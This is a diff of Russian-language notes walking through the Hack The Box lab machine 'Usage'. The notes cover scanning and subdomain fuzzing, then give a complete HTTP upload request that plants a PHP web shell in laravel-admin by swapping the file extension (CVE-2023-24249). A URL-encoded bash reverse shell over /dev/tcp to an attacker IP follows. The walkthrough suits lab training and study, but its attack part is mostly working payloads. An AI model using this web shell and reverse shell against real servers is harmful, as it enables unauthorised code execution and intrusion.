@@ -1,12 +1,94 @@
 https://app.hackthebox.com/machines/Usage
 
+Сканим
+nmap -p 22,80 -sCV 10.10.11.18
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-12 13:35 EDT
+Nmap scan report for 10.10.11.18
+Host is up (0.086s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://usage.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Фаззим
+oxdf@hacky$ ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" -w  /home/kali/Desktop/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac
+
+admin                   [Status: 200, Size: 3304...
+
+echo "10.10.11.18 usage.htb admin.htb" >> /etc/hosts
+
+
+
 SQL_injection в параметре email;
 
 hashcat пароля админа;
 
+
+
 RCE CVE-2023-24249 в laravel-admin через web shell c подменой расширения загружаемого веб шелла через burp;
 
-шелл через /dev/tcp;
+В профиле пользователя administrator загружаем веб шелл, но в формате maxhacker.php.jpg, т.к. фреймворк вредный и не даёт загрузить php.
+При загрузке меняем в запросе расширение файла на обычный php
+
+
+POST /admin/auth/users/1 HTTP/1.1
+Host: admin.usage.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+X-PJAX: true
+X-PJAX-Container: #pjax-container
+X-Requested-With: XMLHttpRequest
+Content-Type: multipart/form-data; boundary=---------------------------4099847802160957289594201327
+Content-Length: 1253
+Origin: http://admin.usage.htb
+Connection: close
+Referer: http://admin.usage.htb/admin/auth/users/1/edit
+Cookie: XSRF-TOKEN=eyJpdiI6ImVnbnpObHFKdGxkWjkxd2VjQkloS3c9PSIsInZhbHVlIjoiS2pPTVI4aStyMmI1cURUTGg5dExtNlNYK2pXbUNhTytpdnBBa24zelI0UVlrR01aTTdqVGovUmU3WEVnUlJ1eG43eFFtQjc1QktUKzFwSnYwYnIrQnZZUTZJVzVxazl1N1MyODV5YkdWTUduaGJqMVhLNkJCZndMeFVtTk1ReSsiLCJtYWMiOiI1ZTJmYmQzZmVjMTgwYTViNmNmMjZjNTZkYzI5YjM4ZjZlNjUxNWYzM2VkYzdmMzkzODIzZWFkZGMwMmZiMGRmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImFkbmJVVlV2WW1NRUt4cDBkV1dZOEE9PSIsInZhbHVlIjoianBzbE81V1BHUFpkZ0IwdTk2YTMvVmlzRjh2TG1wMVhRdUhlNUtaUitXUkQyNXhYYy9LZjRjUmJxOXZEbnVUaGt6WTBIN2h1NWFsN2RTRFV6ZFozVUVac1pKVTZqbzZWeHVGOGsvY0hXdVN6NGJBNkF0RjRmYXVjeUc5ejJ4Q1giLCJtYWMiOiJmYjhhZDc4Yzc0MzZjYzk3NmVlM2ZmNGUwOWFiNzhkZjVkZDE5MDYyZmM3ZjYwNDlkODFmZDQ3MjNiMDQwOTNlIiwidGFnIjoiIn0%3D; remember_admin_59ba36addc2b2f9401580f014c7f58ea4e30989d=eyJpdiI6IlBRNndVMVlrODcraTB4dzhldlk1Y2c9PSIsInZhbHVlIjoiWDBHenB4dEVZZFFscnBQZWpGeVJxdFZSTGVMbUdvZ2x0dW90WEZqdXlxc2lRYXNUWHZPblM5TGhuUW5HbVpxQ2ZJenYwWkdkU0VBWmtZdnpSK3V2Wm9uMmh0U0dlVy94ODJIY0Q3YUtseUEvSEV0NWF0L3JkeStXeUlMQmFDTUlWNytrcHNiaER0V0pTZUNTUklRUUliVjBBRXgxQTYrQWhHRXVFekx6Q3JFUjM4OUJ5R3hMMnZMdXUvd2pTcStDY1hjUFFlN0huVGRlZXVkbmc3RGFkbERiRm5FcFREcHZIRDhESFRhREdpOD0iLCJtYWMiOiJkOGJhYzJkMzRhMDNlYjJkNTg5MTFkNWRiYTdmNjRkZTk4YjNmYWRkODIyZDA1ZjBmZDk1NWFiNTFlZGVjM2FiIiwidGFnIjoiIn0%3D
+-----------------------------4099847802160957289594201327
+Content-Disposition: form-data; name="username"
+admin
+-----------------------------4099847802160957289594201327
+Content-Disposition: form-data; name="name"
+Administrator
+-----------------------------4099847802160957289594201327
+Content-Disposition: form-data; name="avatar"; filename="maxhacker.php"
+Content-Type: image/jpeg
+<?php system($_REQUEST['cmd']); ?>
+-----------------------------4099847802160957289594201327
+Content-Disposition: form-data; name="roles[]"
+1
+-----------------------------4099847802160957289594201327
+Content-Disposition: form-data; name="roles[]"
+-----------------------------4099847802160957289594201327
+Content-Disposition: form-data; name="permissions[]"
+-----------------------------4099847802160957289594201327
+Content-Disposition: form-data; name="_token"
+JCToloURasOqs2QRtKrrXtbwjXUUk3RvwWmQqEqq
+-----------------------------4099847802160957289594201327
+Content-Disposition: form-data; name="_method"
+PUT
+-----------------------------4099847802160957289594201327
+Content-Disposition: form-data; name="_previous_"
+http://admin.usage.htb/admin/auth/users
+-----------------------------4099847802160957289594201327--
+
+
+
+При успешной загрузке, проверяем доступность нашего файла
+http://admin.usage.htb/uploads/images/maxhacker.php
+
+Затем проверяем, может ли он выполнить команды на хосте
+http://admin.usage.htb/uploads/images/maxhacker.php?cmd=id
+
+
+Шелл через /dev/tcp;
+
+http://admin.usage.htb/uploads/images/maxhacker.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.23/4545%200%3E%261%27
 
 поиск кредов для повышения в файлах пользователей;
 
